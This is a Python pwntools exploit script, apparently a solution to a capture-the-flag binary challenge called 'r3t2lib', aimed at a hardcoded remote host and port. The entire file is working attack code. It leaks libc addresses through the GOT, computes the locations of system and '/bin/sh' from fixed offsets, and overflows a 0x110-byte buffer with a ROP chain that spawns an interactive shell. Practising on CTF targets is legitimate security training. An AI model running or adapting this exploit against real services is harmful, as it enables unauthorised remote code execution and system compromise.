#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./r3t2lib"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2123)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    c
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'


rbp = p64(0x12334)
main = p64(0x04006f7)

def leak(address):
    c.sendafter('Give me an address (in hex) :', hex(address))
    c.recvuntil('address : ')
    addr = int(c.recvline()[:-1], 16)

    rop = main
    c.sendlineafter('for me', b'a' * 0x110 + rbp + rop)

    return addr

puts_addr = leak(elf.got['puts'])
gets_addr = leak(elf.got['gets'])
print(hex(puts_addr), hex(gets_addr))
system_addr = puts_addr - 0x2a300
sh_addr = system_addr + 0x147a77



c.sendafter('Give me an address (in hex) :', hex(elf.got['puts']))
rop = b''
rop += p64(0x400843) # pop rdi ; ret
rop += p64(sh_addr)
rop += p64(system_addr)

c.sendlineafter('for me', b'a' * 0x110 + rbp + rop)







c.interactive()
c.close()
